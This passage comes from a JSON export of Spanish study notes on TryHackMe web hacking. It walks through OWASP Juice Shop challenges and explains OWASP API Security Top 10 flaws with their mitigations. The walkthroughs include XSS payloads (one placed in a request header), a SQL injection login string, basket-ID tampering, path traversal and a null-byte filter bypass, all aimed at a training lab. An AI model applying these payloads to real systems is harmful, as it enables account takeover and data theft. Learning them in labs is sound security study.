usuario con un nivel de privilegios superior. |\n\n![[Pasted image 20251211190152.png]]\n\n------------------------------------\n1. Accede a la p√°gina de administraci√≥n.\n\t1. Vamos al Debugger (Firefox) o Sources (Chrome) en las herramientas de desarrollador. Buscamos \"main.js\", le damos al boton `{}` abajo y luego `Ctrl + F` para buscar \"admin\".\n\t   ![[Pasted image 20251211191345.png]]\n\t   Nos interesa `path: 'administration'`.\n\t2. Lo buscamos.\n\t   ![[Pasted image 20251211191940.png]]\n\t3. Ya hab√≠amos obtenido las credenciales, por lo que vamos a iniciar sesi√≥n.\n\t   ![[Pasted image 20251211193320.png]]\n\t4. Volvemos a mirar la p√°gina de administraci√≥n.\n\t   ![[Pasted image 20251211193427.png]]\n2. Mira el carrito de la compra de otro usuario.\n\t1. Nos logueamos como administrador y vamos a \"Your Basket\".\n\t   ![[Pasted image 20251212150544.png]]\n\t2. Capturamos las peticiones y las dejamos pasar con \"Forward\" hasta vet una que diga `GET /rest/basket/1 HTTP/1.1`.\n\t   ![[Pasted image 20251212151555.png]]\n\t3. Cambiamos la terminaci√≥n por `2` en el repeater y le damos a mandar. Podemos ver que funciona, por lo que podemos hacer lo mismo en el proxy y darle a \"Forward\".\n\t   ![[Pasted image 20251212151756.png]]\n\t4. Obtenemos la flag.\n\t   ![[Pasted image 20251212151906.png]]\n3. Elimina todas las rese√±as de 5 estrellas.\n\t1. Vamos a `http://<IP>/#/administration`.\n\t   ![[Pasted image 20251212152213.png]]\n\t2. Eliminamos todas las rese√±as con 5 estrellas (s√≥lo hay 1).\n\t   ![[Pasted image 20251212152240.png]]\n\t3. Obtenemos la flag.\n\t   ![[Pasted image 20251212152258.png]]",
    "modified": "2025-12-13T00:49:57"
  },
  {
    "title": "7. Where did that Come From",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/7-owasp-juice-shop/7-where-did-that-come-from/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/7. OWASP Juice Shop/7. Where did that Come From.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 7. OWASP Juice Shop",
    "content": "![[Pasted image 20251212101057.png]]\n\nXSS es una vulnerabilidad que permite a los atacantes ejecutar javascript en aplicaciones web. Estos son uno de los bugs m√°s encontrados en aplicaciones web.\n\nHay tres tipos principales:\n\n| Tipo                     | Descripci√≥n                                                                                           |\n| ------------------------ | ----------------------------------------------------------------------------------------------------- |\n| DOM (Special)            | Usa el entorno HTML para ejecutar JS malicioso.                                                       |\n| Persistent (Server-side) | Permite al atacante almacenar c√≥digo JS malicioso que es ejecutado cuando el cliente carga la p√°gina. |\n| Reflected (Client-side)  | Es un c√≥digo JS que corre en el navegador del cliente que lo introduce.                               |\n\n----------------------------------------------------\n1. Realiza una DOM XSS.\n\t1. Probaremos con la barra de b√∫squeda.\n\t   ![[Pasted image 20251212110427.png]]\n\t2. Introduciremos el payload `<iframe src=\"javascript:alert(`xss`)\">`.\n\t   ![[Pasted image 20251212112133.png]]\n\t3. Obtenemos la flag.\n\t   ![[Pasted image 20251212112202.png]]\n2. Realiza una Stored XSS.\n\t1. Iniciamos sessi√≥n en la cuenta de administrador.\n\t   ![[Pasted image 20251212113112.png]]\n\t2. Vamos a la p√°gina \"Last Login IP\" en \"Privacy & Security\".\n\t   ![[Pasted image 20251212114350.png]]\n\t   ![[Pasted image 20251212114615.png]]\n\t3. Activamos el modo intercepci√≥n de Burp Suite y hacemos log out.\n\t   ![[Pasted image 20251212114704.png]]\n\t4. Pillamos la petici√≥n.\n\t   ![[Pasted image 20251212121440.png]]\n\t5. Metemos la cookie `True-Client-IP` con el valor `<iframe src=\"javascript:alert('xss')\">`.\n\t   ![[Pasted image 20251212121741.png]]\n\t6. Hacemos `Forward` de la petici√≥n.\n\t   ![[Pasted image 20251212121808.png]]\n\t7. Obtenemos la flag.\n\t   ![[Pasted image 20251212122009.png]]\n3. Realiza una Reflected XSS.\n\t1. Volvemos a la cuenta de administrador, pero esta vez le damos a \"Order History\" en \"Orders & Payment\".\n\t   ![[Pasted image 20251212122510.png]]\n\t2. Aqu√≠ le damos al s√≠mbolo del cami√≥n.\n\t   ![[Pasted image 20251212122552.png]]\n\t3. Eso nos lleva a la p√°gina siguiente donde podemos ver que se refleja el id de b√∫squeda.\n\t   ![[Pasted image 20251212122652.png]]\n\t4. Cambiaremos la URL por el JS malicioso y recargamos.\n\t   ![[Pasted image 20251212123055.png]]\n\t5. Obtenemos la flag.\n\t   ![[Pasted image 20251212123116.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Lets Go on an Adventure",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/7-owasp-juice-shop/2-lets-go-on-an-adventure/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/7. OWASP Juice Shop/2. Lets Go on an Adventure.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 7. OWASP Juice Shop",
    "content": "![[Pasted image 20251209215224.png]]\n\nAntes de meternos en la parte del hacking, es bueno echar un vistazo. En Burp Suite, configuraremos el modo intercepci√≥n en **off** y navegaremos el sitio. Esto permite a Burp Suite registrar diferentes peticiones que pueden ser de ayuda m√°s adelante.\n\nA esto se le llama **walking through an application** que tambi√©n es una forma de reconocimiento.\n\n-------------------------------------------------\n1. ¬øCu√°l es la direcci√≥n de email del Administrador?\n   ![[Pasted image 20251210120845.png]]\n2. ¬øQu√© par√°metro se utiliza para buscar?\n\t1. Le damos a la barra de b√∫squeda y hacemos una.\n\t   ![[Pasted image 20251210122008.png]]\n\t2. Miramos la barra del navegador.\n\t   ![[Pasted image 20251210122039.png]]\n3. ¬øDe qu√© programa hace referencia Jim en su rese√±a?\n\t1. Buscamos la rese√±a de Jim.\n\t   ![[Pasted image 20251210122147.png]]\n\t2. Busamos qu√© es un replicator.\n\t   ![[Pasted image 20251210122536.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Open for Business",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/7-owasp-juice-shop/1-open-for-business/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/7. OWASP Juice Shop/1. Open for Business.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 7. OWASP Juice Shop",
    "content": "En esta unidad veremos las [OWASP Top 10 Vulnerabilities](https://owasp.org/www-project-top-ten/) en aplicaciones web. Encontrar√°s estas en todo tipo de aplicaciones web. Sin embargo ahora nos centraremos en una creaci√≥n de OWASP: la Juice Shop (JS).\n\nSe recomienda encarecidamente manejar Burp Suite antes de comenzar con esta unidad.\n\nJuice Shop es una aplicaci√≥n muy grande por lo que no tendremos tiempo de cubrir todos los t√≥picos de los top 10.\n\nSin embargo veremos los siguientes:\n\n- Injection\n- Broken Authentication\n- Sensitive Data Exposure\n- Broken Access Control\n- Cross-Site Scripting XSS",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. AH Dont Look",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/7-owasp-juice-shop/5-ah-dont-look/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/7. OWASP Juice Shop/5. AH Dont Look.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 7. OWASP Juice Shop",
    "content": "![[Pasted image 20251211174508.png]]\n\nUna aplicaci√≥n web deber√≠a guardar y transmitir informaci√≥n sensible de forma segura. Pero en algunos casos, el desarrollador puede no proteger correctamente su informaci√≥n sensible, haci√©ndola vulnerable.\n\nLa mayor√≠a de veces, la protecci√≥n de la informaci√≥n no se aplica consistentemente a lo largo de la aplicaci√≥n web haciendo ciertas p√°ginas accesibles al p√∫blico. Otras veces, la informaci√≥n se filtra sin conocimiento del desarrollador.\n\n--------------------------------------------\n1. Accede al documento confidencial.\n\t1. Navegamos hasta la p√°gina \"About Us\".\n\t   ![[Pasted image 20251212142516.png]]\n\t2. Vamos al enlace verde.\n\t   ![[Pasted image 20251212142540.png]]\n\t3. Intentamos navegar al directorio padre.\n\t   ![[Pasted image 20251212142605.png]]\n\t   Hemos puesto `http://<IP>/ftp/legal.md/..` y funciona por lo que parece que es vulnerable a Path Traversal.\n\t4. Descargamos **acquisitions.md**.\n\t   ![[Pasted image 20251212142634.png]]\n\t5. Obtenemos la flag.\n\t   ![[Pasted image 20251212142656.png]]\n2. Inicia sesi√≥n en la cuenta de MC SafeSearch.\n\t1. Si vemos el v√≠deo, en los primeros 44 segundos se menciona que su contrase√±a es \"Mr. Noodles\" y que ha cambiado vocales por ceros.\n\t   ![[Pasted image 20251212143500.png]]\n\t2. Intentamos iniciar sesi√≥n con `mc.safesearch@juice-sh.op` y `Mr. N00dles`.\n\t   ![[Pasted image 20251212143537.png]]\n\t3. Y efectivamente obtenemos la flag.\n\t   ![[Pasted image 20251212143551.png]]\n3. Descarga el archivo de Backup.\n\t1. Vamos a la p√°gina de antes.\n\t   ![[Pasted image 20251212143620.png]]\n\t2. Le damos a `package.json.bak`.\n\t   ![[Pasted image 20251212143632.png]]\n\t   Nos hemos encontrado con un error 403, Forbidden.\n\t3. Vamos a usar el `Null Byte` para sobrepasarlo.\n\t\t1. Vamos a Cyber Chef para URL-encodearlo.\n\t\t   ![[Pasted image 20251212143728.png]]\n\t\t2. Lo escribimos en la URL junto con la terminaci√≥n `.md` porque solo se permiten esa y `.pdf`.\n\t\t   ![[Pasted image 20251212143805.png]]\n\t4. Encontramos la flag.\n\t   ![[Pasted image 20251212143935.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/4-owasp-top-10-2021/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/4. OWASP Top 10 - 2021/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 4. OWASP Top 10 - 2021",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 2. Cyber Security 101 -> 8. Web Hacking -> 5. OWASP Top 10 - 2021**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. OWASP Top 10 - 2021",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/4-owasp-top-10-2021/0-owasp-top-10-2021/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/4. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 4. OWASP Top 10 - 2021",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/4. OWASP Top 10 - 2021/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. OWASP API Security Top 10 - 2",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/6-owasp-api-security-top-10-2/0-owasp-api-security-top-10-2/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/6. OWASP API Security Top 10 - 2/0. OWASP API Security Top 10 - 2.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 6. OWASP API Security Top 10 - 2",
    "content": "[[1. Vulnerability VI - Mass Assignment]]\n[[2. Vulnerability VII - Security Misconfiguration]]\n[[3. Vulnerability VIII - Injection]]\n[[4. Vulnerability IX - Improper Assets Management]]\n[[5. Vulnerability X - Insufficient Logging & Monitoring]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Vulnerability VII - Security Misconfiguration",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/6-owasp-api-security-top-10-2/2-vulnerability-vii-security-misconfiguration/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/6. OWASP API Security Top 10 - 2/2. Vulnerability VII - Security Misconfiguration.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 6. OWASP API Security Top 10 - 2",
    "content": "<h2>¬øC√≥mo Ocurre?</h2>\nSecurity misconfiguration refleja una implementaci√≥n de unos protocolos de seguridad incorrecta o pobremente configurados. Varios factores pueden resultar en esto, incluyendo configuraci√≥n por defecto o completa, almacenamiento en la nube accesible autom√°ticamente, [Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS), mensajes de error mostrando informaci√≥n sensible, etc. Los intrusos pueden aprovecharse de esto para realizar reconocimiento detallado.\n\nLa documentaci√≥n API, una lista de endpoints, logs de error, etc no deben ser p√∫blicos.\n\n-------------------------------------------\n<h2>Impacto Posible</h2>\nPuede darle a los intrusos conocimiento completo de los componentes API. El rastreo de stack u otros errores detallados pueden ofrecer informaci√≥n confidencial y detalles esenciales del sistema.\n\n-------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n1. La compa√±√≠a MHT se enfrenta a problemas de disponibilidad del servidor serios. Han asignado a Bob a desarrollar un endpoint API `/apirule/ping_v` (GET) que compartir√° detalles sobre el estado y la salud del servidor.\n2. Bob ha dise√±ado exitosamente el endpoint. Sin embargo ha olvidado implementar manejo de errores para evitar la filtraci√≥n de informaci√≥n.\n   ![[Pasted image 20251209205532.png]]\n3. El problema aqu√≠ es que en caso de una llamada fallida, el servidor manda un stack trace completo, conteniendo nombres de funciones, informaci√≥n sobre controladores y rutas, archivos, etc.\n4. La soluci√≥n es crear un endpoint `/apirule7/ping_s` que maneje los errores y comparta s√≥lo informaci√≥n deseada.\n   ![[Pasted image 20251209205834.png]]\n\n------------------------------\n<h2>Medidas de Mitigaci√≥n</h2>\n- Limitar el acceso a interfaces administrativas para usuarios no autorizados y deshabilitarlas para otros usuarios.\n- Deshabilitar nombres de usuario y contrase√±as por defecto para dispositivos p√∫blicos.\n- Deshabilitar el listado de directorios y configurar permisos correctamente para cada archivo.\n- Eliminar piezas de c√≥digo innecesarias, logs de errores y debugging.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Vulnerability IX - Improper Assets Management",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/6-owasp-api-security-top-10-2/4-vulnerability-ix-improper-assets-management/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/6. OWASP API Security Top 10 - 2/4. Vulnerability IX - Improper Assets Management.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 6. OWASP API Security Top 10 - 2",
    "content": "<h2>¬øC√≥mo Ocurre?</h2>\nInnappropiate Asset Management se refiere al escenario donde tenemos dos versiones de una API disponibles en nuestro sistema; llam√©moslas APIv1 y APIv2. Todo se migra a APIv2, pero APIv1 no ha sido borrada todav√≠a. Cuanto m√°s tiempo pase m√°s peligroso ser√° tenerla disponible e inactiva, pues eso significar√° que m√°s desactualizada estar√° y por tanto m√°s vulnerable ser√°.\n\n---------------------------------\n<h2>Impacto Posible</h2>\nLas versiones m√°s antiguas o no parcheadas de las APIs pueden permitir a los intrusos ganar acceso no autorizado a informaci√≥n confidencial o incluso completo control del sistema.\n\n-----------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n1. Durante el desarrollo API, la compa√±√≠a MHT ha desarrollado diferentes versiones API como v1 y v2. La compa√±√≠a se ha asegurado de usar las √∫ltimas versiones y llamadas pero ha olvidado eliminar la antigua versi√≥n del servidor.\n2. En consecuencia, se ha encontrado que llamadas antiguas de la API como `/apirule9/v1/user/login` devolv√≠an m√°s informaci√≥n de la necesaria como balance bancario, direcci√≥n, etc.\n   ![[Pasted image 20251209212800.png]]\n3. Bob se dio cuenta y ha desactivado la versi√≥n antigua dejando s√≥lo `/apirule9/v2/user/login`.\n   ![[Pasted image 20251209212840.png]]\n\n-----------------------------------------\n<h2>Medidas de Mitigaci√≥n</h2>\n- Acceso a llamadas API previas y sensibles deben ser bloqueadas a nivel de red.\n- Las APIs desarrolladas para R&D, QA, producci√≥n, etc deben ser segregadas y hosteadas en servidores separados.\n- Asegura que la documentaci√≥n de todos los aspectos API, incluyendo la autentificaci√≥n, redirecciones, errores, pol√≠tica CORS y la limitaci√≥n de frecuencia.\n- Adopta est√°ndares abiertos para generar documentaci√≥n autom√°ticamente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Vulnerability X - Insufficient Logging & Monitoring",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/6-owasp-api-security-top-10-2/5-vulnerability-x-insufficient-logging-monitoring/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/6. OWASP API Security Top 10 - 2/5. Vulnerability X - Insufficient Logging & Monitoring.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 6. OWASP API Security Top 10 - 2",
    "content": "<h2>¬øC√≥mo Ocurre?</h2>\nInsufficient logging and monitoring refleja un escenario donde un atacante realiza actividad maliciosa en un servidor. Sin embargo, cuando tratas de trackearlo, no hay suficientes m√©todos/evidencia debido a la falta de mecanismos de registro y monitorizaci√≥n. Muchas organizaciones se centran en el registro de sistemas pero se olvidan del de las APIs.\n\n--------------------------------\n<h2>Impacto Posible</h2>\nNo ser capaz de identificar al atacante/hacker detr√°s de un ataque.\n\n--------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n1. En el pasado, la compa√±√≠a MHT ha sido susceptible de m√∫ltiples ataques y el actor no pudo ser identificado. Por eso Bob fue asignado a hacer un endpoint API `/apurule10/logging` (GET) que registrar√° los metadatos del usuario (direcci√≥n IP, versi√≥n del buscador, etc.) y lo guardar√° en una base de datos.\n   ![[Pasted image 20251209214130.png]]\n2. Despu√©s decidi√≥ que lo mejor ser√≠a redirigirlo a una soluci√≥n SIEM para correlaci√≥n y an√°lisis.\n\n-----------------------------------------\n<h2>Medidas de Mitigaci√≥n</h2>\n- Asegura el uso de SIEM (Security Information and Event Management) para manejo de logs.\n- Lleva un registro de todos los accesos denegados, autentificaci√≥n fallida y errores de validaci√≥n de inputs.\n- Maneja los logs como informaci√≥n sensible y asegura su integridad.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Vulnerability VI - Mass Assignment",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/6-owasp-api-security-top-10-2/1-vulnerability-vi-mass-assignment/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/6. OWASP API Security Top 10 - 2/1. Vulnerability VI - Mass Assignment.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 6. OWASP API Security Top 10 - 2",
    "content": "<h2>¬øC√≥mo Ocurre?</h2>\nMass Assignment refleja un escenario donde la informaci√≥n del lado del cliente se relaciona autom√°ticamente con objetos o variables del lado del servidor. Los hackers explotan esta cualidad entendiendo la l√≥gica de negocio de la aplicaci√≥n y mandando informaci√≥n especialmente construida al servidor, adquiriendo permisos administrativos o insertando informaci√≥n alterada.\n\n---------------------------\n<h2>Impacto Posible</h2>\nEl ataque puede resultar en manipulaci√≥n de informaci√≥n y escalada de privilegios desde un usuario normal a un administrador.\n\n---------------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n1. A Bob le han asignado desarrollar un endpoint API de registro `/apirule6/user` que tomar√° el nombre, nombre de usuario y contrase√±a como par√°metros de input (POST). La tabla de usuarios tiene una columna `credit` con un valor de `50`. Los usuarios mejorar√°n su suscripci√≥n para tener un valor m√°s alto.\n2. Bob ya ha dise√±ado el formulario y usado la funcionalidad de mass assignment en Laravel para guardar toda la informaci√≥n proveniente del lado del cliente a la base de datos.\n   ![[Pasted image 20251208210723.png]]\n3. El problema aqu√≠ es que Bob no est√° filtrando del lado del servidor. Como est√° usando la funcionalidad de mass assign, tambi√©n est√° introduciendo valores de cr√©dito en la base de datos que los atacantes pueden modificar.\n4. La soluci√≥n es asegurarse de que se filtra del lado del servidor `/apirule6/user_s` y que el valor por defecto de cr√©dito debe ser `50` incluso si se introduce otro valor del lado del cliente.\n   ![[Pasted image 20251208212012.png]]\n\n--------------------------------------\n<h2>Medidas de Mitigaci√≥n</h2>\n- Antes de usar cualquier framework, debes estudiar c√≥mo las inserciones y actualizaciones del backend se realizan. En el framework Laravel, los arrays [fillable y guarded](https://laravel.com/docs/9.x/eloquent#inserts) mitigan dichos escenarios.\n- Evita usar funciones que relacionen un input de un cliente a variables de c√≥digo autom√°ticamente.\n- Permite el cambio s√≥lo de aquellas variables que deban ser actualizadas del lado del servidor.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Vulnerability VIII - Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/6-owasp-api-security-top-10-2/3-vulnerability-viii-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/6. OWASP API Security Top 10 - 2/3. Vulnerability VIII - Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 6. OWASP API Security Top 10 - 2",
    "content": "<h2>¬øC√≥mo Ocurre?</h2>\nLos ataques de inyecci√≥n son probablemente los m√°s antiguos relacionados con la web/APIs y todav√≠a se siguen cometiendo. Las debilidades de inyecci√≥n ocurren cuando el input del usuario no se filtra y se procesa directamente por la API. Una inyecci√≥n puede venir de SQL, un SO, XML, PHP, etc.\n\n---------------------------------\n<h2>Impacto Posible</h2>\nLas debilidades de inyecci√≥n pueden llevar a divulgaci√≥n de informaci√≥n, p√©rdida de datos, Dos, y toma completa de la cuenta. Los ataques exitosos tambi√©n pueden causar que los intrusos accedan a informaci√≥n sensible o creen nuevas funcionalidades y ejecuten RCE.\n\n-----------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n1. Algunos usuario de MHT han reportado que su contrase√±a ha cambiado y que no pueden iniciar sesi√≥n en sus cuentas. El equipo de desarrollo se dio cuenta de que Bob hab√≠a dise√±ado un endpoint API de login vulnerable `/apirule8/user/login_v` que no filtraba el input del usuario.\n2. Un atacante requiere el nombre de usuario del objetivo y para la contrase√±a puede usar `' OR 1=1--'` y obtener autorizaci√≥n para dicha cuenta.\n   ![[Pasted image 20251209211145.png]]\n3. Bob se dio cuenta del error y actualiz√≥ el endpoint API a `/apirule8/user/login_s` y us√≥ queries parametrizadas y filtros ya construidos de Laravel para sanitizar.\n   ![[Pasted image 20251209211255.png]]\n\n---------------------------------------\n<h2>Medidas de Mitigaci√≥n</h2>\n- Asegura usar una librer√≠a conocida para la validaci√≥n del lado del cliente.\n- Si no se usa un framework, la informaci√≥n ofrecida por el usuario debe validarse y despu√©s filtrarse y sanitizarse.\n- A√±ade reglas de seguridad necesarias al Firewall de Aplicaci√≥n Web (WAF).\n- Usa filtros preconstruidos en frameworks para validar el input del usuario.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - The Basics",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/3-burp-suite-the-basics/0-burp-suite-the-basics/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/3. Burp Suite - The Basics/0. Burp Suite - The Basics.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 3. Burp Suite - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/0. Burp Suite - The Basics]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/3. Burp Suite - The Basics/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/3-burp-suite-the-basics/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/3. Burp Suite - The Basics/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 3. Burp Suite - The Basics",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 2. Cyber Security 101 -> 8. Web Hacking -> 4. Burp Suite - The Basics**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/9-pickle-rick/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/9. Pickle Rick/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 9. Pickle Rick",
    "content": "Para ver este curso ve a **THM -> Maquinas -> 1. Easy -> 2. Pickle Rick**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Pickle Rick",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/9-pickle-rick/0-pickle-rick/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/9. Pickle Rick/0. Pickle Rick.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 9. Pickle Rick",
    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/0. Pickle Rick]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/9. Pickle Rick/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/2-http-in-detail/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/2. HTTP in Detail/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 2. HTTP in Detail",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 3. How the Web Works -> 2. HTTP in Detail**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. HTTP in Detail",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/2-http-in-detail/0-http-in-detail/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/2. HTTP in Detail/0. HTTP in Detail.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 2. HTTP in Detail",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/0. HTTP in Detail]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/2. HTTP in Detail/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Filtering",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/6-filtering/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/6. Filtering.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
